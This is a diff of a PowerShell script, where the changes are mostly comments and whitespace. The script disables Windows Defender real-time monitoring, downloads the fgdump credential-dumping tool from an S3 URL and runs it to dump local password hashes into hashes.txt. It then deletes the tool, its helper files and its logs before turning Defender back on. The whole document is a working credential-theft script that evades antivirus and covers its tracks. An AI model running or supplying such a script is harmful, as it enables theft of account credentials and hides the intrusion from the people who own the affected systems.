@@ -1,23 +1,26 @@
-#Disable Windows defender
+# Disable Windows defender
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-#Download fgdump
+# Download fgdump
 $url = "https://s3.amazonaws.com/mellondefender.tools/fgdump.exe"
 $output = "$PSScriptRoot\fgdump.exe"
 
 Import-Module BitsTransfer
 Start-BitsTransfer -Source $url -Destination $output
 
-#Extract downloaded file
+# Extract downloaded file | not necessary for fgdump
 #Expand-Archive $PSScriptRoot\fgdump.zip -DestinationPath $PSScriptRoot\fgdump
 
+# Location of fgdump
 $exeloc = "$PSScriptRoot\fgdump.exe"
 
-#Run pwdump7, pipe output in same path as script
+# Run fgdump
 start-process $exeloc
 
+# Allow to create output before closing
 Start-Sleep -s 5
 
+# Close fgdump if it's hanging (results already piped)
 $hang = Get-process -Name "fgdump" -ErrorAction SilentlyContinue
 if ($hang) {
 $hang.closeMainWindow()
@@ -27,21 +30,23 @@ if (!$hang.HasExited) {
   }
 }
 
+# Output hashes will be stored in hashes.txt
 Rename-Item -Path "$PSScriptRoot\127.0.0.1.pwdump" -NewName "hashes.txt"
 
+# Delete fgdump and helper files
 $FileName = "$PSScriptRoot\127.0.0.1.cachedump"
-if (Test-Path $FileName) 
+if (Test-Path $FileName)
 {
   Remove-Item $FileName
 }
 
 $FileName = "$PSScriptRoot\fgdump.exe"
-if (Test-Path $FileName) 
+if (Test-Path $FileName)
 {
   Remove-Item $FileName
 }
 
-ls *.fgdump-log -Recurse | foreach {rm $_} 
+ls *.fgdump-log -Recurse | foreach {rm $_}
 
-#Enable Windows defender
+# Reenable Windows defender
 Set-MpPreference -DisableRealtimeMonitoring $false
